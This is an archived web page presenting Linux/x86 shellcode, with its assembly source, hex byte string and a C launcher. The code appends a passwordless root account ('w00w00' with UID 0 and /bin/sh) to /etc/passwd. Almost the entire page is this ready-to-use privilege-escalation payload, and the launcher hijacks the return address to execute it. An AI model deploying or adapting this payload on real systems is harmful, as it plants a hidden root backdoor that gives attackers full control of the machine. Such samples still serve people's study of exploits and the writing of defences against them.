<html><head><title>Linux/x86 - Add root user /etc/passwd - 104 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*

  jmp call_w00w00

w00w00:
  popl %edi
  jmp w0w0w

call_w00w00:

  call w00w00

w0w0w:

 # OPEN
 # ecx=flag (O_RDONLY, O_WRONLY, ...) 
 #     O_WRONLY | O_APPEND | O_CREAT = 0x441
 # edx=file mode
 # ebx=address of filename
 # eax=0x05 syscall number

  xorl %ebx,%ebx
  movb $(file-w0w0w),%bl
  addl %edi,%ebx

  xorb %al,%al
  movb %al,11(%ebx)

  xorl %ecx,%ecx
  movw $0x441,%cx

  xorl %edx,%edx
  movw $00644,%dx

  xorl %eax,%eax
  movb $0x5,%al

  int $0x80
  movl %eax,%ebx    # save file descriptor to %ebx (for write)
 
#  WRITE
#  ecx=address of buffer to write
#  edx=number of bytes to write
#  ebx=file descriptor
#  eax=0x04
  
  xorl %ecx,%ecx
  movb $(string-w0w0w),%cl
  addl %edi,%ecx

  xorl %edx,%edx
  movb $31,%dl

  xorl %eax,%eax
  movb $0x04,%al

  int $0x80                                           
  
  xorl %eax,%eax
  movb $1,%al
  int $0x80
  
file:  
.ascii &quot;/etc/passwd&quot;
endfile:
.byte 1 
string:
.ascii &quot;w00w00::0:0:w0w0w!:/:/bin/sh\n&quot;

*/

/* 
 * Source to this is pass.s
 * This will append a root line to the passwd file (see the source).
 *
 * Shok (Matt Conover), shok@dataforce.net
 */

char shellcode[]=
  &quot;\xeb\x03\x5f\xeb\x05\xe8\xf8\xff\xff\xff\x31\xdb\xb3\x35\x01\xfb&quot;
  &quot;\x30\xc0\x88\x43\x0b\x31\xc9\x66\xb9\x41\x04\x31\xd2\x66\xba\xa4&quot;
  &quot;\x01\x31\xc0\xb0\x05\xcd\x80\x89\xc3\x31\xc9\xb1\x41\x01\xf9\x31&quot;
  &quot;\xd2\xb2\x1f\x31\xc0\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80\x2f&quot;
  &quot;\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x01\x77\x30\x30\x77\x30&quot;
  &quot;\x30\x3a\x3a\x30\x3a\x30\x3a\x77\x30\x77\x30\x77\x21\x3a\x2f\x3a&quot;
  &quot;\x2f\x62\x69\x6e\x2f\x73\x68\x0a&quot;;

void main()
{

  int *ret;
  
  printf(&quot;w00w00!\n&quot;);
  ret = (int *)&amp;ret + 2;
  (*ret) = (int)shellcode;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
